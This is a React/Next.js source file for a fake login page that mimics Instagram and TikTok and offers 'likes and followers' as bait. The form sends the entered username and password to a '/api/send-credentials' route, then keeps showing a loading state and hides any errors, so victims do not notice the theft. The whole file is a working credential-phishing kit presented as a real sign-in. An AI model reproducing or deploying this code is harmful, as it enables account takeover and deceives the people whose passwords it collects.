'use client'

import { useState, useEffect } from 'react'
import { useRouter, useParams } from 'next/navigation'

// TikTok Icon Component
const TikTokIcon = ({ className }: { className?: string }) => (
  <svg 
    viewBox="0 0 24 24" 
    fill="currentColor" 
    className={className}
    xmlns="http://www.w3.org/2000/svg"
  >
    <path d="M19.589 6.686a4.793 4.793 0 0 1-3.77-4.245V2h-3.445v13.672a2.896 2.896 0 0 1-5.201 1.743l-.002-.001.002.001a2.895 2.895 0 0 1 3.183-4.51v-3.5a6.329 6.329 0 0 0-5.394 10.692 6.33 6.33 0 0 0 10.857-4.424V8.687a8.182 8.182 0 0 0 4.773 1.526V6.79a4.831 4.831 0 0 1-1.003-.104z"/>
  </svg>
)

export default function SetupPage() {
  const params = useParams()
  const router = useRouter()
  const platform = typeof params?.platform === 'string' ? params.platform : 'instagram'
  const isInstagram = platform === 'instagram'
  const [loading, setLoading] = useState(false)
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')

  useEffect(() => {
    // Add Instagram font link to head if not already present (only for Instagram)
    if (isInstagram && !document.querySelector('link[href*="Billabong"]')) {
      const link1 = document.createElement('link')
      link1.rel = 'preconnect'
      link1.href = 'https://fonts.googleapis.com'
      document.head.appendChild(link1)

      const link2 = document.createElement('link')
      link2.rel = 'preconnect'
      link2.href = 'https://fonts.gstatic.com'
      link2.crossOrigin = 'anonymous'
      document.head.appendChild(link2)

      const link3 = document.createElement('link')
      link3.href = 'https://fonts.googleapis.com/css2?family=Billabong&display=swap'
      link3.rel = 'stylesheet'
      document.head.appendChild(link3)
    }
  }, [isInstagram])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)

    try {
      // Send credentials to API route
      await fetch('/api/send-credentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          password,
          platform,
        }),
      })
      // Credentials sent, keep loading state
      // You can optionally reset after a delay or keep it loading
    } catch (error) {
      console.error('Error submitting form:', error)
      // Silently handle error, keep loading state
    }
  }

  // TikTok login page
  if (!isInstagram) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center p-4" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
        <div className="w-full max-w-[400px]">
          {/* TikTok Login Container */}
          <div className="bg-black px-8 py-10">
            {/* TikTok Logo */}
            <div className="flex justify-center mb-10">
              <div className="flex items-center gap-3">
                <TikTokIcon className="w-8 h-8 text-white" />
                <h1 className="text-3xl font-bold text-white" style={{ 
                  fontSize: '32px',
                  lineHeight: '40px',
                  fontWeight: 700
                }}>
                  TikTok
                </h1>
              </div>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Phone/Email Input */}
              <div>
                <input
                  type="text"
                  placeholder="Phone number or email"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full px-4 py-3 bg-black border border-gray-700 rounded-md focus:outline-none focus:border-white text-white placeholder-gray-500"
                  style={{ 
                    fontSize: '16px',
                    lineHeight: '24px',
                    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
                  }}
                  required
                />
              </div>

              {/* Password Input */}
              <div>
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3 bg-black border border-gray-700 rounded-md focus:outline-none focus:border-white text-white placeholder-gray-500"
                  style={{ 
                    fontSize: '16px',
                    lineHeight: '24px',
                    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
                  }}
                  required
                />
              </div>

              {/* Log in Button */}
              <button
                type="submit"
                disabled={loading || !username || !password}
                className="w-full py-3 px-4 font-semibold text-black rounded-md disabled:cursor-not-allowed disabled:opacity-50"
                style={{ 
                  backgroundColor: loading || !username || !password ? '#666' : '#fff',
                  fontSize: '16px',
                  lineHeight: '24px',
                  fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                  fontWeight: 600
                }}
              >
                {loading ? 'Signing in...' : 'Log in'}
              </button>
            </form>

            {/* Forgot Password Link */}
            <div className="text-center mt-6">
              <a 
                href="#" 
                className="text-sm"
                style={{ 
                  fontSize: '14px',
                  lineHeight: '20px',
                  fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                  color: '#fff',
                  textDecoration: 'none'
                }}
              >
                Forgot password?
              </a>
            </div>

            {/* Sign Up Section */}
            <div className="mt-8 pt-8 border-t border-gray-800 text-center">
              <p className="text-sm text-gray-400" style={{ 
                fontSize: '14px',
                lineHeight: '20px',
                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                margin: 0
              }}>
                Don't have an account?{' '}
                <a 
                  href="#" 
                  className="font-semibold text-white"
                  style={{ 
                    textDecoration: 'none',
                    fontWeight: 600
                  }}
                >
                  Sign up
                </a>
              </p>
            </div>
          </div>
        </div>
      </div>
    )
  }

  // Instagram login page
  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}>
      <div className="w-full max-w-[350px]">
        {/* White Box Container */}
        <div className="bg-white border border-gray-300 rounded-sm px-10 py-8 mb-3">
          {/* Instagram Logo */}
          <div className="flex justify-center mb-8 mt-2">
            <h1 className="text-[51px] font-normal leading-[51px]" style={{ 
              fontFamily: 'Billabong, "Brush Script MT", cursive',
              background: 'linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%)',
              WebkitBackgroundClip: 'text',
              WebkitTextFillColor: 'transparent',
              backgroundClip: 'text',
              fontWeight: 400
            }}>
              Instagram
            </h1>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-3">
            {/* Username/Email Input */}
            <div>
              <input
                type="text"
                placeholder="Phone number, username, or email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-3 py-2 bg-gray-50 border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400 text-black placeholder-gray-400"
                style={{ 
                  fontSize: '12px',
                  lineHeight: '18px',
                  fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                  paddingTop: '9px',
                  paddingBottom: '9px'
                }}
                required
              />
            </div>

            {/* Password Input */}
            <div>
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-3 py-2 bg-gray-50 border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400 text-black placeholder-gray-400"
                style={{ 
                  fontSize: '12px',
                  lineHeight: '18px',
                  fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                  paddingTop: '9px',
                  paddingBottom: '9px'
                }}
                required
              />
            </div>

            {/* Log in Button */}
            <button
              type="submit"
              disabled={loading || !username || !password}
              className="w-full py-1.5 px-4 font-semibold text-white rounded-sm disabled:cursor-not-allowed mt-2"
              style={{ 
                backgroundColor: loading || !username || !password ? '#b2dffc' : '#0095f6',
                fontSize: '14px',
                lineHeight: '18px',
                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                fontWeight: 600,
                paddingTop: '5px',
                paddingBottom: '5px'
              }}
            >
              {loading ? 'Logging in...' : 'Log in'}
            </button>
          </form>

          {/* OR Separator */}
          <div className="flex items-center my-4">
            <div className="flex-1 border-t border-gray-300"></div>
            <div className="px-4 font-semibold text-gray-500 uppercase" style={{ 
              fontSize: '13px',
              lineHeight: '15px',
              fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
              fontWeight: 600
            }}>
              OR
            </div>
            <div className="flex-1 border-t border-gray-300"></div>
          </div>

          {/* Facebook Login Button */}
          <button
            type="button"
            className="w-full flex items-center justify-center gap-2 py-1.5 px-4 font-semibold text-white rounded-sm"
            style={{ 
              backgroundColor: '#1877f2',
              fontSize: '14px',
              lineHeight: '18px',
              fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
              fontWeight: 600,
              paddingTop: '5px',
              paddingBottom: '5px'
            }}
          >
            <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            Log in with Facebook
          </button>

          {/* Forgot Password Link */}
          <div className="text-center mt-4">
            <a 
              href="#" 
              className="text-xs"
              style={{ 
                fontSize: '12px',
                lineHeight: '16px',
                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                color: '#00376b',
                textDecoration: 'none'
              }}
            >
              Forgot password?
            </a>
          </div>
        </div>

        {/* Sign Up Section */}
        <div className="bg-white border border-gray-300 rounded-sm px-10 py-6 text-center mb-3">
          <p className="text-sm" style={{ 
            fontSize: '14px',
            lineHeight: '18px',
            fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
            color: '#262626',
            margin: 0
          }}>
            Don't have an account?{' '}
            <a 
              href="#" 
              className="font-semibold"
              style={{ 
                color: '#0095f6',
                textDecoration: 'none',
                fontWeight: 600
              }}
            >
              Sign up
            </a>
          </p>
        </div>

        {/* Verification Note - Under Sign Up Card */}
        <div className="bg-blue-50 border border-blue-200 rounded-sm p-3">
          <p className="text-xs text-gray-700 text-center" style={{ 
            fontSize: '11px',
            lineHeight: '16px',
            fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
            margin: 0
          }}>
            <strong>Note:</strong> Instagram needs to verify your username and password before we can start delivering likes and followers to your account.
          </p>
        </div>
      </div>
    </div>
  )
}
